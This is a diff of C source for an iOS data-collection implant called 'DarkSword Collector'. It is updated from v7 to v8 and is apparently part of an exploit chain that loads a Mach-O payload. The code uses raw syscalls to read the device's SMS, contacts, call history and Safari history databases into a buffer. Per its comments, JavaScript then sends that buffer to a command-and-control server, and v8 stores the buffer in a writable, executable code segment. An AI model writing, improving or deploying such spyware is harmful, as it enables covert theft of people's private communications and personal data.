@@ -1,6 +1,7 @@
 /**
- * DarkSword Collector v7 - Read files via raw syscalls, store in buffer
- * JavaScript reads buffer after ds_start returns and sends to C2
+ * DarkSword Collector v8 - Raw syscalls, buffer in __TEXT segment
+ * __TEXT is mapped RWX by MachOPayloadBuilder, so we can write to it
+ * JS reads ds_result from __TEXT after ds_start returns
  */
 
 static int _strlen(const char *s) { int n=0; while(s[n]) n++; return n; }
@@ -38,66 +39,50 @@ static long _svc3(long n, long a, long b, long c) {
 #define SYS_open  5
 #define SYS_read  3
 #define SYS_close 6
+#define SYS_write 4
 
-/* Exported result buffer - JS reads this from mapped memory after ds_start returns */
-char ds_result[4096];
-int ds_result_len = 0;
+/* Buffer in __TEXT,__const - MachOPayloadBuilder maps __TEXT RWX */
+__attribute__((section("__TEXT,__const")))
+char result_buf[2048];
+__attribute__((section("__TEXT,__const")))
+int result_len;
 
 static void _append(const char *s) {
     int sl = _strlen(s);
-    if (ds_result_len + sl < 4095) {
-        _memcpy(ds_result + ds_result_len, s, sl);
-        ds_result_len += sl;
-        ds_result[ds_result_len] = 0;
+    int pos = result_len;
+    if (pos + sl < 2047) {
+        _memcpy(result_buf + pos, s, sl);
+        result_len = pos + sl;
+        result_buf[result_len] = 0;
     }
 }
 static void _append_int(int v) { char b[16]; _itoa(v,b); _append(b); }
 
-static void _read_file(const char *path, const char *name) {
-    _append("{\"name\":\"");
-    _append(name);
-    _append("\",\"path\":\"");
-    _append(path);
-    _append("\",");
-
-    int fd = (int)_svc2(SYS_open, (long)path, 0);
-    if (fd < 0) {
-        _append("\"status\":\"access_denied\"},");
-        return;
-    }
-
-    char data[512];
-    int n = (int)_svc3(SYS_read, fd, (long)data, sizeof(data) - 1);
-    _svc1(SYS_close, fd);
-    if (n < 0) n = 0;
-    data[n] = 0;
-
-    _append("\"status\":\"ok\",\"size\":");
-    _append_int(n);
-    _append(",\"hex\":\"");
-
-    int max = n < 128 ? n : 128;
-    for (int i = 0; i < max; i++) {
-        char hex[3];
-        hex[0] = "0123456789abcdef"[(unsigned char)data[i] >> 4];
-        hex[1] = "0123456789abcdef"[(unsigned char)data[i] & 0xf];
-        hex[2] = 0;
-        _append(hex);
-    }
-    _append("\"},");
-}
-
 void ds_start(void) {
-    ds_result[0] = 0;
-    ds_result_len = 0;
-    _append("[");
-    _read_file("/var/mobile/Library/SMS/sms.db", "SMS");
-    _read_file("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", "Contacts");
-    _read_file("/var/mobile/Library/CallHistoryDB/CallHistory.storedata", "CallHistory");
-    _read_file("/var/mobile/Library/Safari/History.db", "Safari");
-    if (ds_result_len > 1 && ds_result[ds_result_len-1] == ',') {
-        ds_result_len--;
-        ds_result[ds_result_len] = 0;
+    /* Reset */
+    result_buf[0] = 0;
+    result_len = 0;
+
+    /* Write to stderr as debug signal */
+    const char *msg = "[v8] ds_start\n";
+    _svc3(SYS_write, 2, (long)msg, _strlen(msg));
+
+    /* Try open + read SMS db */
+    int fd = (int)_svc2(SYS_open, (long)"/var/mobile/Library/SMS/sms.db", 0);
+    if (fd >= 0) {
+        char data[256];
+        int n = (int)_svc3(SYS_read, fd, (long)data, sizeof(data)-1);
+        _svc1(SYS_close, fd);
+        if (n < 0) n = 0;
+        data[n] = 0;
+
+        _append("{\"SMS\":{\"size\":");
+        _append_int(n);
+        _append(",\"ok\":true}}");
+    } else {
+        _append("{\"SMS\":{\"ok\":false}}");
     }
-    _append("]");
+
+    const char *done = "[v8] done\n";
+    _svc3(SYS_write, 2, (long)done, _strlen(done));
 }
